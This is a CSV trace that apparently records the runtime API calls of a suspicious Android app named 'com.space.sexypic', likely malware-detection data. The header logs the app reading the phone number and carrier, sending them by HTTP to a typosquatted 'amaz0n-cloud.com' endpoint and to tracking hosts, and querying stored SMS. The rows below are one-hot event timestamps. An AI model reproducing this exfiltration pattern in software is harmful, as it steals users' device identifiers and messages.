Time(1ms),"ACTIVITY_EVENT0{appName=com.space.sexypic, action=onCreate, acitivityName=class com.space.sexypic.SexyPic}",SharedPref.edit711,getLine1Number170,"SharedPref.putString712{value=15555215554, key=phone}",SharedPref.commit713,SharedPref.edit716,getNetworkOperatorName149,"SharedPref.putString717{value=Android, key=carrier}",SharedPref.commit718,FileInputStream.<init>304{path=/data/data/com.space.sexypic/files},"Http.setEntity115{uri=http://www.amaz0n-cloud.com/droid/droid.php, HttpEntity=number=15555215554&carrier=Android&message=viewed&sdk=4.1.2}",Http.execute115{uri=http://www.amaz0n-cloud.com/droid/droid.php},net.Socket.connect357{inet_address=/69.195.129.70:80},"SERVICE_EVENT0{appName=com.space.sexypic, serviceName=class com.space.sexypic.Pusher, action=onCreate}",getLine1Number648,Http.execute885{uri=http://freeappsettings.com/apps/notif.php?phone=15555215554},net.Socket.connect179{inet_address=/208.73.210.217:80},"ACTIVITY_EVENT0{appName=com.space.sexypic, action=onCreate, acitivityName=class com.space.sexypic.PicViewer}",FileInputStream.<init>521{path=/data/data/com.space.sexypic/files},getLine1Number201,getNetworkOperatorName199,"Http.setEntity973{uri=http://www.amaz0n-cloud.com/droid/droid.php, HttpEntity=number=15555215554&carrier=Android&from=&content=&message=pressed+ok&sdk=4.1.2}",Http.execute973{uri=http://www.amaz0n-cloud.com/droid/droid.php},net.Socket.connect525{inet_address=/69.195.129.70:80},FileInputStream.<init>519{path=/data/data/com.space.sexypic/files},"Http.setEntity973{uri=http://www.amaz0n-cloud.com/droid/droid.php, HttpEntity=number=15555215554&carrier=Android&from=tracked&content=tracked&message=tracked&sdk=4.1.2}",Http.execute919{uri=http://ggtrack.org/SM1O?device_id=15555215554&adv_sub=15555215554},net.Socket.connect471{inet_address=/67.215.66.149:80},FileOutputStream.<init>470{path=/data/data/com.space.sexypic/files},FileOutputStream.close716,"ACTIVITY_EVENT0{appName=com.space.sexypic, action=onStop, acitivityName=class com.space.sexypic.SexyPic}",FileOutputStream.<init>524{path=/data/data/com.space.sexypic/files},FileOutputStream.close524,"Http.setEntity973{uri=http://www.amaz0n-cloud.com/droid/droid.php, HttpEntity=number=15555215554&carrier=Android&from=&content=&message=fromsharedpref&sdk=4.1.2}","ACTIVITY_EVENT0{appName=com.space.sexypic, action=onStop, acitivityName=class com.space.sexypic.PicViewer}","ACTIVITY_EVENT0{appName=com.space.sexypic, action=onDestory, acitivityName=class com.space.sexypic.PicViewer}","ACTIVITY_EVENT0{appName=com.space.sexypic, action=onDestory, acitivityName=class com.space.sexypic.SexyPic}",query739{ Uri=content://sms}
0,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
190,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
214,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
233,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
250,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
332,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
346,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
356,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
367,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
421,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1272,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1291,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1350,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,
1368,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,
1334078,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1334256,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1334295,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1334313,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1334326,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1334342,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1334376,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1334387,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1334398,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1334411,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1335297,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1335322,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1335383,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,
1335404,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,
1363860,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,
1365010,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,
1365029,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,
1365065,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,
1365280,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,
1376835,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,
1376919,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,
1376939,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,
1376959,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,
1376993,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,
1377004,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,
1377058,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,
1386248,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,
1386262,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,
1386282,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,
1386300,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,
1386313,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,
1386366,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,
1395528,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,
1395545,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,
1395564,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,
1413082,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,
1418446,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,
1418537,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,
1422279,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,
1479087,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,
1479105,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,
1479125,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,
1479138,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,
1479156,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,
1479165,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,
1479200,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,
1488802,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,
1488822,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,
1558957,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1559030,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1559152,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1559248,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1559266,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1559288,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1559316,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1559326,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1559338,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1559347,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1559556,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,
1559569,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,
1559856,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,
1559883,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,
1559981,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,
1561290,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,
1562122,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,
1562135,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,
1565123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,
1565132,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,
1571059,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1571320,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1571421,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1571562,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1571609,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1571660,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1571690,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1571742,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1571789,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1571840,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1571956,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,
1572008,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,
1572557,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,
1577264,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1
1577355,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,
1577370,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,
1577396,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,
1577406,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,
1577448,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,
1745684,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1745756,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1745858,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1745887,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1745906,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1745976,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1745999,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1746008,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1746019,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1746028,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1746245,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,,
1746271,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,,
1746457,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,
1746545,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,
1746530,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,,,,,
1747793,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,
1764847,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,
1764863,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,
1767392,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,
1767423,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,
1779868,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1
1779976,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,,
1780009,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,,,
1780081,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,,,,
1780091,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,,
1780136,,,,,,,,,,,,,,,,,,,,,,,,1,,,,,,,,,,,,,,
